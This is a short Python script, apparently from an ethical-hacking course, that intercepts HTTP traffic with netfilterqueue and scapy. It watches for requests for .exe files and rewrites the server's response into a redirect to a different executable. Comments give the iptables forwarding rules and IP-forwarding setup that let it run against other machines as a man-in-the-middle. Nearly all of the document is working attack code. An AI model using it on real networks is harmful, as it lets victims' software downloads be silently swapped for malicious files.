#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
            ack_list.append(scapy_packet[scapy.TCP].ack)
            # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            # print("HTTP response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # print(scapy_packet.show())
                scapy_packet[
                    scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://the.earth.li/~sgtatham/putty/latest/w64/putty.exe\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# you must run iptables rules for input and output for queue 0
# for local use

# iptables --flush
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables --flush


# ales entoles

# iptables --flush
# iptables --table nat --flush
# iptables --table nat --delete-chain
# iptables -P FORWARD ACCEPT
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# echo 1 > /proc/sys/net/ipv4/ip_forward
# service apache2 start